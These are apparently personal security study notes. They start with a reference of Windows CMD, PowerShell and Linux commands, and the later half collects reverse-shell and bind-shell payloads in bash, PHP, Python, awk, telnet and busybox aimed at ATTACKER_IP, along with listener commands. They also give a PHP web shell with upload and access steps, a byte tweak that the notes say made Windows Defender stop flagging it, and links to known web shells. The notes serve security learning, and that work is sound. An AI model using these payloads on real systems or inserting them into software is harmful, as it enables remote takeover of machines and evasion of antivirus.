# Windows CLI

| Command | Utility |
| :--- | :--- |
| **Basic system information** | |
| `set` | Check your path |
| `ver` | Determine OS version |
| `systeminfo` | OS information, system details, processor, memory |
| `help` | For help |
| `cls` | Clear screen |
| `<command> \| more` | For multi-page commands, press `space` to navigate |
| `driverquery` | Displays a list of installed device drivers |
| **Network troubleshooting** | |
| `ipconfig` / `ipconfig /all` | IP address, subnet mask, default gateway |
| `ping target_name` | Send ICMP packet and listen for response, to check if website is online or not. Target_name = website name/ip address |
| `tracert target_name` | Trace route |
| `nslookup target_name` / `nslookup target_name 1.1.1.1` | Looks up host and returns IP address |
| `netstat` | Current network connections and listening ports.<br> `-a`: all established connections and listening ports <br> `-b`: shows program associated with each port and established connection <br> `-o`: reveals PID associated with each connection <br> `-n`: numerical form of each port and address |
| **File and disk management** | |
| `cd` | Current directory |
| `dir` | Child directories <br> `dir /a`: display hidden and system files <br> `dir /s`: display files in current directory and all subdirectories |
| `tree` | Visually represent child and subdirectories |
| `mkdir name` | Make directory |
| `rmdir name` | Remove directory |
| `type file.name` / `more file.name` | View text files |
| `copy file1.txt file2.txt` | Copy files |
| `move file1.txt ..` | Move files |
| `del file.name` / `erase file.name` | Delete files |
| `chkdsk` | Checks the file system and disk volumes for errors and bad sectors |
| `sfc /scannow` | Scans system files for corruption and repairs them if possible | 
| **Task and process management** | |
| `tasklist` | List running processes. Check all available filters using `tasklist /?`. Example: `tasklist /FI "imagename eq image.name"` (filter image name equals image.name) |
| `taskkill` | Use with PID flag to stop a process. `taskkill /PID pid_number` |
| `shutdown` | `shutdown /s`: Shutdown a system <br> `shutdown /r`: Restart a system <br> `shutdown /a`: Abort a scheduled system shutdown |
| `powershell` | Run Powershell |

# Windows Powershell

They were made using an object-oriented approach, allowing for more powerful data manipulation. The commands are known as command-lets (cmdlets) and follow a consistent Verb-Noun naming convention.

| Command | Utility |
| :--- | :--- |
| **Basics** | |
| `Get-Command` | Lists all available cmdlets. `Get-Command -CommandType "Type"` retrieves commands of type Type. |
| `Get-Help <cmdlet>` | Help function to understand a cmdlet. `-examples` property adds examples too |
| `Get-Date` | Gets current date and time |
| `Get-Alias` | Some cmdlets have aliases from Windows CLI |
| `Find-Module` | Downloads additional cmdlets from online repositories. `Cmdlet -Property "pattern*"` is the syntax. Example property for Find-Module: `Find-Module -Name "Powershell*"` gets all repos with powershell in their name and more (due to *) |
| `Install-Module` | Installs a module from online repository. (Module = set of cmdlets) Usage: `Install-Module -Name "Name"` |
| `Write-Output` | Repeats the input in the console, like `echo` |
| **File manipulation** | |
| `Get-ChildItem` | Lists files and directories located inside a path. Usage: `Get-ChildItem -Path "C:/Path"` |
| `Set-Location` | Sets the current directory. Usage: `Set-Location -Path "C:/Path"` |
| `New-Item` | Creates a new item of any type. Usage: `New-Item -Path "./Path" -ItemType "File/Directory"` |
| `Remove-Item` | Removes an item. Usage: `Remove-Item -Path "./Path/File.txt"` |
| `Copy-Item` | Copy an item from one path to a destination path. Usage: `Copy-Item -Path "./OriginalPath" -Destination "./NewPath"` |
| `Move-Item` | Move an item from one path to a destination path. Usage: `Move-Item -Path "./OriginalPath" -Destination "./NewPath"` |
| `Get-Content` | Gets the content of the file and displays it on console. Usage: `Get-Content -Path "C:/Path"` |
| `Get-Item` | Gets details about an item at a particular path. Usage: `Get-Item -Path "C:/Path"`. `-Stream *` property can be used to view attached Alternate Data Streams (ADS). `$DATA` is the default data stream of NTFS files, anything apart from that is potentially an ADS |
| **Piping, Filering, Sorting Data** | Piping can be used using `\|` to send the output of the first command (in PS, its an object) as the input for the second command |
| `Sort-Object` | Sort objects based on a property. Usage: `Get-ChildItem \| Sort-Object Length`. Length is size of the object |
| `Where-Object` | Filters objects based on certain properties. Example: `Get-ChildItem \| Where-Object -Property "Extension" -eq ".txt"`<br> Comparison operators: <br> `-eq`: equal to <br> `-ne`: not equal <br> `-gt`: greater than <br> `-ge`: greater than equal to <br> `-lt`: less than <br> `-le`: less than equal to <br> `-like pattern*` property can also be used for similarity/pattern-based filtering |
| `Select-Object` | Selects specific properties from objects or limit number of objects returned. Usage: `Get-ChildItem \| Select-Object Name,Length`. Use property `-First <number>` to get the first x number of results. | 
| `Select-String` | Searches for text patterns within files. Usage: `Select-String -Path "./Path" -Pattern "pattern"` |
| **System and Network Information** | |
| `Get-ComputerInfo` | Retrieves comprehensive system information, including operating system information, hardware specifications, BIOS details, and more |
| `Get-LocalUser` | Lists all local user accounts on the system |
| `Get-NetIPConfiguration` | Provides detailed information about the network interfaces on the system, including IP addresses, DNS servers, and gateway configurations |
| `Get-NetIPAddress` | Shows details for all IP addresses configured on the system, including those that are not currently active |
| **Real-time System Analysis** | |
| `Get-Process` | Provides a detailed view of all currently running processes |
| `Get-Service` | Allows the retrieval of information about the status of services on the machine |
| `Get-NetTCPConnection` | Displays current TCP connections. (Note: handy during an incident response or malware analysis task, as it can uncover hidden backdoors or established connections towards an attacker-controlled server) |
| `Get-FileHash` | Generating file hashes, helps verify integrity | 
| `Invoke-Command` | Executes commands on local and remote computers. Usage: <br> `Invoke-Command -FilePath c:\scripts\test.ps1 -ComputerName Server01` (for local) <br> `Invoke-Command -ComputerName Server01 -Credential Domain01\User01 -ScriptBlock { Get-Service }` (for remote, the cmdlet inside {} is the command to be run on the remote system) | 

## Comparing all 3 CLI languages

| Windows CLI | PowerShell | Linux |
|------------|------------|--------|
| `help` | `Get-Help` | `man`, `--help` |
| `cls` | `Clear-Host` (`cls` alias) | `clear` |
| `set` | `Get-ChildItem Env:` / `Get-Item Env:` | `env`, `printenv` |
| `ver` | `Get-ComputerInfo` | `uname -a`, `hostnamectl` |
| `systeminfo` | `Get-ComputerInfo` | `hostnamectl`, `lscpu`, `free`, `uname -a` |
| `cd` | `Set-Location` | `cd` |
| `dir` | `Get-ChildItem` | `ls` |
| `tree` | `tree` | `tree` |
| `mkdir` | `New-Item -ItemType Directory` | `mkdir` |
| `rmdir` | `Remove-Item` | `rmdir`, `rm -r` |
| `type`, `more` | `Get-Content` | `cat`, `less`, `more` |
| `copy` | `Copy-Item` | `cp` |
| `move` | `Move-Item` | `mv` |
| `del`, `erase` | `Remove-Item` | `rm` |
| `findstr` | `Select-String` | `grep` |
| `<command> \| more` | `<command> \| Out-Host -Paging` | `<command> \| less` |
| `ipconfig` | `Get-NetIPConfiguration` | `ip addr`, `ifconfig` |
| `ping` | `Test-Connection` | `ping` |
| `tracert` | `Test-NetConnection -TraceRoute` | `traceroute`, `tracepath` |
| `nslookup` | `Resolve-DnsName` | `nslookup`, `dig`, `host` |
| `netstat` | `Get-NetTCPConnection` | `netstat`, `ss` |
| `tasklist` | `Get-Process` | `ps`, `top` |
| `taskkill` | `Stop-Process` | `kill`, `pkill` |
| `shutdown /s` | `Stop-Computer` | `shutdown -h now`, `poweroff` |
| `shutdown /r` | `Restart-Computer` | `reboot`, `shutdown -r now` |
| `driverquery` | `Get-CimInstance Win32_PnPSignedDriver` | `lsmod`, `modinfo` |
| `chkdsk` | `Repair-Volume` | `fsck` |
| `sfc /scannow` | `Repair-WindowsImage`, `sfc` |  |
|  | `Get-Date` | `date` |
|  | `Get-LocalUser` | `getent passwd`, `cat /etc/passwd` |
|  | `Get-Service` | `systemctl`, `service` |
|  | `Get-FileHash` | `sha256sum`, `md5sum`, `sha1sum` |
|  | `Invoke-Command` | `ssh`, `pdsh`, `ansible` |
| `sort` | `Sort-Object` | `sort` |
| `findstr` | `Where-Object` | `grep`, `awk` |
|  | `Select-Object` | `cut`, `awk`, `head` |
| `echo` | `Write-Output` | `echo` |

# Reverse Shell

Commonly referred to as the "connect back shell," it allows an attacker to execute commands remotely after the target connects back.

### How Reverse Shells Work

- Set up a netcat listener
- Gaining reverse shell access through payload
- Attacker receives the shell

### Set Up a Netcat Listener

- **Example Usage**: `nc -lvnp 443` 
  - `nc` = netcat
  - `-l` = indicates netcat to listen or wait for a connection
  - `v` = verbose output
  - `n` = prevents connections from using DNS for lookup (therefore, no hostname resolved)
  - `-p` = indicates the port that will be used, common examples: 53 (DNS), 80 (HTTP), 8080 (HTTP), 443 (HTTPS), 139 (NetBIOS Session Service), 445 (SMB) 
  - This is run on the **TERMINAL**
  
### Gaining Reverse Shell Access

- A payload is required for gaining access to the reverse shell. In the example below, we will use a **pipe reverse shell**.
- **Example Usage**:  `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
  - `rm -f /tmp/f`: removes any existing pipe file in /tmp/f to ensure the creation of a new pipe file without conflicts
  - `mkfifo /tmp/f`: creates a named pipe/FIFO at /tmp/f. These allow for 2-way communication between processes.
  - `cat /tmp/f`: reads data from the named pipe
  - `| sh -i 2>&1`: the data read is piped to a shell instance (`sh -i`) which allows the attacker to execute commands interactively. `2>&1` redirects standard error (STDERR) to standard output (STDOUT), ensuring error messages get sent back to attacker.
  - `| nc ATTACKER_IP ATTACKER PORT`: that is further piped to the attacker's IP and on the attacker's port through netcat
  - `>/tmp/f`: sends the output of the commands back into the named pipe, allowing bi-directional communication
  - This is run using **COMMAND INJECTION**, semicolons added on both sides of the command. (; COMMAND;)

## Shell Payloads

| Payload Name | Payload Command | Description |
| :--- | :--- | :--- |
| **Bash** | | |
| Normal Bash Reverse Shell | `bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1` | This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error. |
| Bash Read Line Reverse Shell | `exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 \| while read line; do $line 2>&5 >&5; done` | This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket. |
| Bash With File Descriptor 196 Reverse Shell | `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196` | This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection. |
| Bash With File Descriptor 5 Reverse Shell | `bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5` | Similar to the first example, this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection. |
| **PHP** | | |
| PHP Reverse Shell Using the exec Function | `php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'` | This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output. |
| PHP Reverse Shell Using the shell_exec Function | `php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'` | Similar to the previous command, but uses the shell_exec function. |
| PHP Reverse Shell Using the system Function | `php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'` | This reverse shell employs the system function, which executes the command and outputs the result to the browser. |
| PHP Reverse Shell Using the passthru Function | `php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'` | The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data. |
| PHP Reverse Shell Using the popen Function | `php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'` | This reverse shell uses popen to open a process file pointer, allowing the shell to be executed. |
| **Python** | | These require `python -c` to be run, as indicated by the placeholder `PY -C` |
| Python Reverse Shell by Exporting Environment Variables | `export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'` | This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output. |
| Python Reverse Shell Using the subprocess Module | `PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'` | This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command. |
| Short Python Reverse Shell | `PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'` | This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2(). |
| **Others** | | |
| Telnet | `TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF \| sh 1>$TF` | This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443. |
| AWK | `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" \|& s; s \|& getline c; if(c){ while ((c \|& getline) > 0) print $0 \|& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` | This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection. |
| BusyBox | `busybox nc ATTACKER_IP 443 -e sh` | This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker. |

# Bind Shell

Bind shells bind a port on the compromised system and listen for connections. When the connection occurs, it exposes the shell session so the attacker can execute commands remotely. Privy to detection since it needs to remain active and listen for connections.

### How Bind Shells Work

- Setting up the Bind Shell on the Target
- Attacker connects to the Bind Shell

### Setting up the Bind Shell

- A payload is required.
- **Example Usage**: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`
  - `rm -f /tmp/f`: removes any existing pipe file in /tmp/f to ensure the creation of a new pipe file without conflicts
  - `mkfifo /tmp/f`: creates a named pipe/FIFO at /tmp/f. These allow for 2-way communication between processes.
  - `cat /tmp/f`: reads data from the named pipe
  - `| bash -i 2>&1`: the data read is piped to a shell instance (`bash -i`) which allows the attacker to execute commands interactively. `2>&1` redirects STDERR to STDOUT, ensuring error messages get sent back to attacker.
  - `| nc -l 0.0.0.0 8080`: starts netcat in listen mode (`-l`) on all interfaces (`0.0.0.0`) and port `8080`. The shell will be exposed to the attacker once they connect to the port. **Note**: Ports below 1024 will require netcat to be executed with elevated privileges.
  - `>/tmp/f`: sends the output of the commands back into the named pipe, allowing bi-directional communication

### Attacker Connects to Bind Shell

- **Example Usage**: `nc -nv TARGET_IP 8080`
  - `nc` = netcat
  - `-n` = disables DNS resolution, making netcat act faster
  - `v` = verbose output
  - `TARGET_IP` = IP address of machine where the bind shell is running
  - `8080` = port number on which bind shell is running

# Shell Listeners

There are other tools apart from `netcat` that can allow us to listen to shells.

- **Rlwrap**
  - Usage: `rlwrap nc -lvnp 443` (Here, the rlwrap wraps the nc)
  - uses a GNU readline library to provide editing keyboard and history, allowing use of arrow keys and history while using netcat.
- **Ncat**
  - Usage: `ncat -lvnp 4444` / `ncat --ssl -lvnp 4444`
  - Improved version by NMAP project, provides additional features like encryption (SSL).
- **Socat**
  - Usage: `socat -d -d TCP-LISTEN:443 STDOUT`
    - `-d` = for verbose output, 2 -d's means more verbose
    - `TCP-LISTEN:443` = creates a TCP listener on port 443
    - `STDOUT` = directs any incoming data to terminal
  - allows you to create a socket connection between 2 data sources or 2 different hosts 

# Web Shells

A script written in the language supported by the compromised web server, executes commands through the web server itself. Languages supported include: **PHP, JSP, ASP, and even simple CGI scripts**

**Example Usage**:
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd' /* omitted for documentation */]);
}
?>
```
- The above shell can be saved with a .php extension, for example: shell.php
- Then it can be uploaded onto the web server by exploiting vulnerabilities such as *Unrestricted File Upload, File Inclusion, Command Injection*, among others.
- After the web shell is deployed on the server, it can be accessed via browser through URL: http://victim.com/uploads/shell.php
- Since the code says we need to provide a GET method and the value of the variable `cmd` should contain the command the attacker wants to execute, the URL to execute commands should be http://victim.com/uploads/shell.php?cmd=whoami where it executes the command `whoami`. 
- *Note: The comment /\*omitted for documentation\*/ was added as Windows defender kept flagging this file as malicious due to the example web shell. The comment changed the byte pattern so now it no longer detects it as malicious. The Example Usage is just for educational purpose.*

**Existing Web Shells Online**:
- p0wny-shell: minimalistic single-file PHP web shell, allows remote command execution
- b374k shell: feature-rich PHP web shell, with file management and command execution
- c99 shell: well-known and robust PHP web shell with extensive functionalities
- You can find more web shells at r57shell.net/index.php